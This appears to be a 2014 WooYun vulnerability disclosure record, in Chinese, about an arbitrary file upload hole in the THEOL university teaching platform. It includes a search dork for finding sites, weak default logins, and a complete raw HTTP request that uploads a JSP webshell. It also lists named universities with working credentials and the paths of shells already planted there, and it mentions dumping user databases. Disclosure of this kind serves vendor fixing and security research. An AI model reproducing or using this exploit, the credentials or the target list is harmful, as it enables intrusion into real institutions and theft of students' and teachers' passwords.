{"id": 41809, "wybug_id": "wooyun-2014-087609", "wybug_title": "THEOL网络教学综合平台通用型任意文件上传", "wybug_corp": "清华大学教育技术研究所", "wybug_author": "路人甲", "wybug_date": "2014-12-19 11:51", "wybug_open_date": "2015-03-19 11:52", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向公众公开  简要描述： 系统某处存在任意文件上传，可脱裤 详细说明：  系统全名\"THEOL清华教育在线\"网络教学综合平台，由清华大学教育技术研究所提供技术支持，其部署在全国大部分高校，用作选课、评分、在线考试等关键字：inurl:eol/homepage/common/或：欢迎进入网络教学综合平台\n\n1#以任意身份帐号登录该系统帐号例：teachertheol_teacherteacher_ptheol_student以及百度到的学号密码：123456000000以及百度到的学号2#在课程描述的教学录像处存在任意上传页面：http://*/eol/popups/jpkrecord/upload_file.jsp?courseId=*其代码中有对用户的权限进行判断，如果登录的是普通权限帐号则返回错误,如果登录admin帐号则判断其它\nif (!um.checkPermission(User.USER_PERM_JPKADMIN_BASIC)&&(column.getCourse().getCourseRecordOperational()== JPKConstant.COLUMN_OPERATIONAL_FALSE||um.getID()!=column.getCourse().getInstructorId()))        throw new JspException(\"您没有权限！\");....省略n行<form action=\"<%=um.checkPermission(User.USER_PERM_JPKADMIN_BASIC)?response.encodeURL(\"admin_receive.jsp\"):response.encodeURL(\"receive.jsp\")%>\" enctype=\"multipart/form-data\" method=\"post\" name=\"uploadForm\" id=\"uploadForm\" >\n好了我们不管，直接看上传调用页面receive.jsp，http://*/eol/popups/jpkrecord/receive.jsp其代码中仅判断用户是否有效，甚至还有莫名奇妙的注释\n<%    UserManager um =  (UserManager)session.getAttribute(\"um\");    if (!um.checkPermission(User.USER_PERM_USER_BASIC))        throw new JspException(\"您没有权限！\");%>...省略//    fu.setAllowFiles(\".txt;.jpg;.bmp;.rm;.rmvb;.htm;.exe;.avi\");\n正常能够登录的用户权限均为4098 状态值4098 \n\n具体可以参考(不同版本路径可能不同)eol/web/WEB-INF/classes/net/theol/projects/eol2004/user.class\n\n即，只要用任意一个允许登录系统的帐号登录系统后，直接通过POST以下数据，即可将马传至服务器，注意替换相应“*”位置\nPOST http://*/eol/popups/jpkrecord/receive.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://*/eol/popups/jpkrecord/upload_file.jsp?columnId=7262Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7de1fc3b1c0c26Accept-Encoding: gzip, deflateHost: *Content-Length: 420Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=*; helpperm=95-----------------------------7de1fc3b1c0c26Content-Disposition: form-data; name=\"rd\"columnId=7262-----------------------------7de1fc3b1c0c26Content-Disposition: form-data; name=\"fileid\"; filename=\"1.jsp\"Content-Type: application/octet-streamtest-----------------------------7de1fc3b1c0c26Content-Disposition: form-data; name=\"addFile\"?? ??-----------------------------7de1fc3b1c0c26--\n   漏洞证明：  以东华理工大学为例：（theol_student/123456）http://eol.ecit.cn/eol/homepage/common/opencourse/\n\n访问地址：http://eol.ecit.cn/eol/data/jpk/0/1.jsp\n\n\nPOST http://eol.ecit.cn/eol/popups/jpkrecord/receive.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://eol.ecit.cn/eol/popups/jpkrecord/upload_file.jsp?columnId=7262Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7de1fc3b1c0c26Accept-Encoding: gzip, deflateHost: eol.ecit.cnContent-Length: 410Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=A95906ABE55FCFDB9CAAFC5FB538181F.T5; JSESSIONID=6DA317CE3259325E42057DBCF09825C3.T5; helpperm=95-----------------------------7de1fc3b1c0c26Content-Disposition: form-data; name=\"rd\"columnId=7262-----------------------------7de1fc3b1c0c26Content-Disposition: form-data; name=\"fileid\"; filename=\"1.jsp\"Content-Type: application/octet-streamtest-----------------------------7de1fc3b1c0c26Content-Disposition: form-data; name=\"addFile\"?? ??-----------------------------7de1fc3b1c0c26--\n上刀：http://eol.ecit.cn/eol/data/jpk/0/2.jsp（sqzr）\n\n至于怎么脱裤，大家都会，就不说了。以下案例供复现：厦门大学course.xmu.edu.cn：（theol_teacher/123456）http://course.xmu.edu.cn/meol/data/jpk/0/wooyun.jsp\n\n\n\n\n\n-----------------------------------------------------------------以下不截图了，点到为止，学校数量太多了温州大学e-learning.wzu.edu.cn：（09zj1/09zj1）http://e-learning.wzu.edu.cn/data/jpk/0/wooyun.jsp华南理工大学222.16.42.161（301A1/123456）http://222.16.42.161/eol/data/jpk/0/wooyun.jsp新疆大学edu.xju.edu.cn（teacher/123456）http://edu.xju.edu.cn/eol/data/jpk/0/wooyun.jsp山东大学www.eol.sdu.edu.cn（teacher/123456）http://www.eol.sdu.edu.cn/eol/data/jpk/0/wooyun.jsp五邑大学eol.wyu.edu.cn（theol_teacher/000000）http://eol.wyu.edu.cn/eol/data/jpk/0/wooyun.jsp......备注：脱裤马要用POST传才可正常访问   修复方案：  上传点做好过滤吧，弱口令就爱莫能助了，密码最好不要明文存在EOL_USER表里说一说危害吧，很多大学已经开始用单点登录了，如果裤子被脱了，相信大部分老湿和童鞋的密码都会暴露出来，话说天朝滴老湿，你们的工资好高哟~~~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-12-24 08:37 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向教育网应急组织通报,由其后续协调软件生产厂商处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-16 16:39 |    \t\t念念不忘 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 求基友)\t\t \n  洞主你的课程描述在哪里找到的。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}